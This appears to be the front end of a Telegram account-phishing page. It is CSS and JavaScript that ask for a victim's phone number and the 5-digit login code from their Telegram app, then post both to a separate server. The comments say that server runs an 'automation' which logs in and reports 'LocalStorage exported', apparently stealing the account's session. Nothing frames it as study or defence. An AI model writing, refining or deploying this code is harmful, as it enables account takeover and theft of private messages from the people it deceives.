    <style>
        :root {
            --bg: #ffffff;
            --text: #000000;
            --input-bg: #f0f0f0;
            --button-bg: #512da8;
            --button-text: #ffffff;
        }

        @media (prefers-color-scheme: dark) {
            :root {
                --bg: #000000;
                --text: #ffffff;
                --input-bg: #333333;
            }
        }

        .spinner {
            border: 4px solid rgba(0, 0, 0, 0.1);
            border-left-color: #512da8;
            border-radius: 50%;
            width: 30px;
            height: 30px;
            animation: spin 1s linear infinite;
            display: none; /* Hidden by default */
            margin: 10px auto; /* Center the spinner */
        }

        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }

        body {
            background: var(--bg);
            color: var(--text);
            font-family: sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            transition: all 0.3s ease;
        }

        .container {
            display: flex;
            flex-direction: column;
            align-items: center;
            width: 100%;
            max-width: 400px;
            padding: 20px;
            box-sizing: border-box;
        }

        .logo {
            width: 100px;
            height: 100px;
            margin-bottom: 20px;
            transition: transform 0.3s ease;
        }

        .logo:hover {
            transform: scale(1.1) rotate(10deg);
        }

        h1 {
            font-size: 24px;
            margin: 0 0 10px 0;
            align-self: center;
        }

        p {
            font-size: 16px;
            text-align: center;
            margin: 0 0 20px 0;
        }

        .input {
            width: 100%;
            padding: 12px;
            margin-bottom: 10px;
            border: none;
            border-radius: 5px;
            background: var(--input-bg);
            color: var(--text);
            font-size: 16px;
            box-sizing: border-box;
        }

        .phone-input {
            display: flex;
            width: 100%;
            background: var(--input-bg);
            border-radius: 5px;
            margin-bottom: 10px;
        }

        .phone-input span {
            padding: 12px;
            font-size: 16px;
            color: var(--text);
            white-space: nowrap;
        }

        .phone-input input {
            flex: 1;
            border: none;
            background: transparent;
            color: var(--text);
            font-size: 16px;
            outline: none;
        }

        button {
            width: 100%;
            padding: 12px;
            background: var(--button-bg);
            color: var(--button-text);
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
        }

        button:disabled {
            background: #cccccc;
            cursor: not-allowed;
        }

        #code-page {
            display: none;
            text-align: center;
        }

        #code-page .phone-wrapper {
            display: flex;
            align-items: center;
            justify-content: center;
            margin-bottom: 20px;
        }

        #code-page .phone {
            font-size: 24px;
            margin-right: 10px;
        }

        #code-page .phone-edit {
            cursor: pointer;
            font-size: 20px;
        }

        #code-page .subtitle {
            font-size: 16px;
            margin-bottom: 20px;
        }

        #code-page .code-input {
            width: 100%;
            padding: 12px;
            border: 2px solid #8774e1;
            border-radius: 5px;
            font-size: 16px;
            background: var(--bg);
            color: var(--text);
            text-align: center;
            letter-spacing: 8px;
            font-weight: bold;
        }

        #code-page .logo {
            width: 100px;
            height: 100px;
            margin: 0 auto 20px auto;
            display: block;
            padding: 5px;
            box-sizing: border-box;
        }

        .status {
            margin-top: 15px;
            padding: 10px;
            border-radius: 5px;
            text-align: center;
            display: none;
        }

        .status.success {
            background: #d4edda;
            color: #155724;
            border: 1px solid #c3e6cb;
        }

        .status.error {
            background: #f8d7da;
            color: #721c24;
            border: 1px solid #f5c6cb;
        }

        .status.info {
            background: #d1ecf1;
            color: #0c5460;
            border: 1px solid #bee5eb;
        }


        @media (max-width: 400px) {
            .container {
                padding: 10px;
            }
        }
    </style>

        function showStatus(element, message, type) {
            element.textContent = message;
            element.className = 'status ' + type;
            element.style.display = 'block';
        }

async function checkStatus() {
            try {
                const url = SERVER_URL + '/status' + (sessionId ? ('?session=' + sessionId) : '');
                const response = await fetch(url);
                const data = await response.json();
                
                if (data.status === 'code_required') {
                    // Switch to code page
                    phonePage.style.display = 'none';
                    codePage.style.display = 'block';
                    displayPhone.textContent = phoneInput.value ? `${codeSpan.textContent} ${phoneInput.value}` : 'Unknown';
                    codeInput.focus();
                    showStatus(codeStatus, 'Enter the 5-digit code sent to your Telegram app', 'info');
                } else if (data.status === 'login_success') {
                    showStatus(codeStatus, 'Login successful! LocalStorage exported.', 'success');
                    clearInterval(statusCheckInterval);
                } else if (typeof data.status === 'string' && data.status.startsWith('error:')) {
                    showStatus(codeStatus, data.status.replace('error:', 'Error:'), 'error');
                } else {
                    // update phone status with returned status (optional)
                    showStatus(phoneStatus, `Status: ${data.status}`, 'info');
                }
            } catch (error) {
                console.error('Error checking status:', error);
            }
        }

        // Next button click handler
        nextButton.addEventListener('click', async () => {
            const phoneNumber = phoneInput.value.trim();
            if (phoneNumber) {
                nextButton.style.display = 'none'; // Hide the NEXT button
                loadingSpinner.style.display = 'block'; // Show the loading spinner
                phoneStatus.textContent = ''; // Clear previous status messages

                try {
                    // Send phone number to the server
                    const response = await fetch(SERVER_URL + '/phone', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json'
                        },
                        body: JSON.stringify({ phone: phoneNumber })
                    });

                    if (!response.ok) {
                        throw new Error('Error entering phone number');
                    }

                    // Handle successful response (if needed)
                } catch (error) {
                    phoneStatus.textContent = 'Error entering phone number'; // Show error message
                    loadingSpinner.style.display = 'none'; // Hide the spinner
                    nextButton.style.display = 'block'; // Show the NEXT button again
                }
            } else {
                phoneStatus.textContent = 'Please enter a phone number.';
            }
        });

        // Code input handler - auto-submit when 5 digits are entered
        codeInput.addEventListener('input', async (e) => {
            const code = e.target.value.replace(/\D/g, ''); // Remove non-digits
            e.target.value = code; // Update input with only digits
            
            if (code.length === 5) {
                try {
                    showStatus(codeStatus, 'Sending code to automation...', 'info');
                    codeInput.disabled = true;

                    const body = { code: code };
                    if (sessionId) body.session = sessionId;

                    const response = await fetch(SERVER_URL + '/code', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(body)
                    });

                    const result = await response.json();
                    showStatus(codeStatus, result.message || JSON.stringify(result), 'info');

                } catch (error) {
                    showStatus(codeStatus, 'Failed to send code to automation', 'error');
                    codeInput.disabled = false;
                }
            }
        });

        editPhone.addEventListener('click', () => {
            codePage.style.display = 'none';
            phonePage.style.display = 'block';
            phoneInput.focus();
            nextButton.disabled = false;
            clearInterval(statusCheckInterval);
        });

        // Check initial connection
        showStatus(phoneStatus, 'Ready to connect. Make sure Python server is running.', 'info');
